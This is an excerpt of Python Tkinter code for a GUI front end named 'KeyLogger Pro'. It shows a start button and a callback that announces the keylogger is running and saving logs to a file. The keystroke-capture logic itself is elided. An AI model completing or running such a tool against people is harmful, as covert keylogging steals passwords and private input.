...
def butaction():
    ...
    print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in ' log.jason' ")
...
empty = Label(root, text="KeyLogger Pro", font='verdana 11 bold').grid(row=3,column=3)

empty = Label (root, text="   ").grid(row=4,column=0)
empty = Label (root, text="   ").grid(row=5,column=0)

Button(root, text="Start KeyLogger Pro", command=butaction).grid(row=6,column=3)
root.mainloop()
